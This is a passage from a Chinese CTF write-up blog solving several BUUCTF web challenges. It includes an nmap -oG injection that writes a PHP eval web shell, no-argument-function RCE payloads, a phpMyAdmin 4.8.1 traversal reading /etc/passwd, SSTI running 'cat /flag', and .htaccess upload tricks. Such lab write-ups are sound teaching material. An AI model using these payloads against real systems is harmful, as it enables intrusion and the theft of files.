关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:                                      <span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()                <span class="comment">#对应于之前的多线程打开</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:                                              <span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>







<h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>代码审计一下，有两个新鲜函数escapeshellarg()，escapeshellcmd()。</strong></p>
<p>关于这两个函数绕过可以看看：</p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.baidu.com/link?url=hmHQm0WU4_sK19NtydFvnEzmDDW5WzkovBOKKimBjt2L0REY6lyxRsoczpN1x-kzhT0sH2xZy-r11RPlMZVZMX6WdBwaXcOFPJfPjE27_pNkutAqNaCo1xWISD_oF9Xr&amp;wd=&amp;eqid=ea0fc88a0002d3fc00000006606dc09d">https://www.baidu.com/link?url=hmHQm0WU4_sK19NtydFvnEzmDDW5WzkovBOKKimBjt2L0REY6lyxRsoczpN1x-kzhT0sH2xZy-r11RPlMZVZMX6WdBwaXcOFPJfPjE27_pNkutAqNaCo1xWISD_oF9Xr&amp;wd=&amp;eqid=ea0fc88a0002d3fc00000006606dc09d</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44348894/article/details/105520481">https://blog.csdn.net/weixin_44348894/article/details/105520481</a></p>
<p>两个函数共同使用会导致字符串逃逸。</p>
<p>代码最后一行有个system，我们可以构造payload传到这个命令中，这里还要知道nmap命令中，参数-oG可以实现将命令和结果写到文件。</p>
<p>构造payload：</p>
<p><code>?host=&#39; &lt;?php @eval($_POST[1]);?&gt; -oG 1.php &#39;</code></p>
<p>这两边留空格，如果不留空格，执行后的语句会变成：</p>
<p><code>\&lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php\\</code></p>
<p>还可以写payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=<span class="string">&#x27; &lt;?php echo `cat /flag`;?&gt; -oG 1.php &#x27;</span></span><br></pre></td></tr></table></figure>

<p>反引号执行命令。</p>
<p>绕过主要还是看这两个函数的特性，最后还有一个nmap写入命令的语法。</p>
<p><strong>本题关键：两个函数有顺序配合造成漏洞，nmap命令写入，反引号可以执行命令。</strong></p>
<h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p>f12查看源码，访问+文件名，下载了一个word文档，内容：Are you sure the flag is here? ? ?</p>
<p>继续看一下网页，点击help，url有个filename参数，应该可以构造什么注入。</p>
<p>可以用来下载文件。</p>
<p>这里尝试一下下载flag.docx，没有这个文件。但是泄露了版本，这里应该跟访问文件目录有关系。</p>
<p><img src="buu2/1.png"></p>
<p>对于java的了解比较少，看一下wp。</p>
<p>了解一下源码泄露的利用办法：</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/wy_97/article/details/78165051">https://blog.csdn.net/wy_97/article/details/78165051</a></p>
<p>了解到WEB-INF是java的web应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：</p>
<p>WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p>
<p>​         </p>
<pre><code>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
</code></pre>
<p>​         </p>
<pre><code>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
</code></pre>
<p>​         </p>
<pre><code>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
</code></pre>
<p>​         </p>
<pre><code>/WEB-INF/database.properties：数据库配置文件
</code></pre>
<p>flag文件应该在classes目录。</p>
<p>开始测试，我的hackbar比较low，不能直接该post型，使用burp。</p>
<p>这里的意思不是让我们提交的数据以post方式提交。</p>
<p>先访问/WEB-INF/web.xml来找到flag位置。</p>
<p><img src="buu2/2.png"></p>
<p>然后反编译(其实就是把.换成/)，得到payload:</p>
<p><img src="buu2/3.png"></p>
<p>得到base64编码，解码得到flag。</p>
<p><strong>本题关键：主要是对java的web应用的安全目录一个了解，后续还有很多不同语言的框架需要学习。</strong></p>
<h3 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h3><p>知道是.htaccess文件上传，先上传一个内容:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>

<p>该语句作用是让<strong>Apache</strong>将其他类型文件均以php格式解析。</p>
<p>这里上传jpg后缀的文件会导致上传失败，只能使用gif或png后缀上传，但是文件类型又需要的是image/jpeg。</p>
<p><strong>本题关键：.htaccess文件上传</strong></p>
<h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p>git源码泄露，使用工具，githack，之前用的那个一直报错，换了一个。</p>
<p>下载地址</p>
<p><a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
<p>输入<code>GitHack.py http://0512f6df-b60e-4405-b403-7db5f19a622e.node3.buuoj.cn/.git/</code></p>
<p>得到源码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>代码审计一下，过滤了伪协议，我最爱的php://filter也被过滤了。</p>
<p>本题难点就在绕过第三个条件。</p>
<p>又是知识盲区，看一下wp。</p>
<p><em><strong>什么是无参数函数RCE</strong></em>：</p>
<p>RCE:<strong>远程命令执行ping和远程代码执行evel。</strong></p>
<p>源码中有<code>@eval($_GET[&#39;exp&#39;]);</code>，可以注入一句话木马，但是有正则替换限制，</p>
<p><code>if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;]))</code></p>
<p>(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。</p>
<p>如果使用参数就无法通过正则验证，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">只允许执行如下命令：</span><br><span class="line">system()</span><br><span class="line">不允许：</span><br><span class="line">system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">https://www.cnblogs.com/wangtanzhi/p/12260986.html</a></p>
<p>首先要得到当前目录下的文件，**scandir()**可以实现，</p>
<p>这里我们要好好找一下php相关无参数函数，</p>
<p><strong>print_r()</strong> 函数用于打印变量，以更容易理解的形式展示。如果给出的是<em>数组</em>，将会按照一定格式显示键和元素。object 与数组类似。</p>
<p><strong>localeconv() 函数</strong>   函数返回一包含本地数字及货币格式信息的<em>数组</em>。</p>
<p>构造出payload：</p>
<p><code>?exp=print_r(scandir(current(localeconv())));</code></p>
<p>或者</p>
<p><code>?exp=print_r(scandir(pos(localeconv())));</code> pos是current别名。</p>
<p>还有 ：<strong>current(localeconv())永远都是个点</strong></p>
<p><img src="buu2/5.png"></p>
<p>怎么读取倒二个数组？查看一下current()函数语法：</p>
<p><img src="buu2/6.png"></p>
<p><em>不能直接得到倒数第二个，别想着连用两次这个函数，连用两次，第一次返回的结果是值，不是数组，会报错。</em></p>
<p><strong>方法一：相反顺序返回数组。</strong></p>
<p>函数<strong>array_reverse()</strong></p>
<p>构造payload：</p>
<p><code>?exp=print_r(next(array_reverse(scandir(pos(localeconv())))));</code></p>
<p><img src="buu2/7.png"></p>
<p>可算返回flag.php了。</p>
<p>然后通过函数readfile()读取或者hightlight_file()函数或者show_source()。</p>
<p>得到flag，f12查看。</p>
<p><strong>方法二：随机交换数组的键和值，直到返回flag.php。</strong></p>
<p>函数array_flip()交换数组的键和值，通过array_rand() 函数返回数组中的一个随机键名。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_rand(array,number)</span><br></pre></td></tr></table></figure>

<p>构造payload：</p>
<p><code>?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));</code></p>
<p>这两个函数缺一不可。如果没有交换键和值，只能得到键名，无法读取值的内容。</p>
<p>方法三：通过**session_id(session_start())**得到flag信息。</p>
<p>PHPSESSID本身就支持flag.php字符。</p>
<p>session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。</p>
<p>session_id()可以获取到当前的session id。</p>
<p>因此我们手动设置名为PHPSESSID的cookie，并设置值为flag.php。</p>
<p><img src="buu2/8.png"></p>
<p>cookie值记得只能是flag.php，要把多余的红字部分删除。</p>
<h3 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h3><p>什么都没发现，肯定有什么备份文件或者是别的目录，试了一下robots.txt，得到一个文件，phpinfo.php，访问一下得到该php相关信息，好像用处不大，也用不了一句话木马，目录还有一个phpmyadmin，这个跟题目相关了，访问一下。</p>
<p>看了一下phpmyadmin版本4.8.1，百度一下存在远程文件读取漏洞，</p>
<p>可以参考一下：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/leixiao-/p/10265150.html">https://www.cnblogs.com/leixiao-/p/10265150.html</a></p>
<p>构造payload：</p>
<p><code>index.php?target=db_sql.php%253f/../../../../../etc/passwd</code></p>
<p><img src="buu2/9.png"></p>
<p><code>index.php?target=db_sql.php%253f/../../../../../flag</code></p>
<p>读取flag。</p>
<p><img src="buu2/10.png"></p>
<p><em>这里%253f什么意思呢，其实就是传入的参数会被url解密两次，最后得到拼接符?</em></p>
<h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p>抓包伪造一下xff字段，回显改成我们伪造的ip值，看一下别的页面，hint.php有你知道为什么我知道你的ip吗？</p>
<p>这里的xff字段应该存在什么漏洞。原来存在ssti注入。</p>
<p>构造payload：</p>
<p><code>&#123;&#123;system('cat /flag')&#125;&#125;</code></p>
<p><img src="buu2/11.png"></p>
<p>这题突破口在于发现存在ssti注入。要根据题目来找注入点。</p>
<h3 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h3><p><em><strong>原理：$$导致的变量覆盖漏洞。</strong></em></p>
<p>扫描目录，由于访问太频繁会被限制，要多加些参数。</p>
<p><code>python dirsearch.py -u http://d5007599-5248-4224-ac1d-c82113740615.node3.buuoj.cn/ --timeout=2 -t 1 -s 0.01</code></p>
<p>-t 表示线程，-s表示每次请求间隔的时间，–timeout表示连接超时时间。</p>
<p>关于dirsearch相关用法可以看看：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43936524/article/details/115271837">https://blog.csdn.net/qq_43936524/article/details/115271837</a></p>
<p>扫了过后，我们可以发现.git源码泄露，使用githack得到源码。</p>
<p>很奇怪没找到源码，先网上找找源码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><s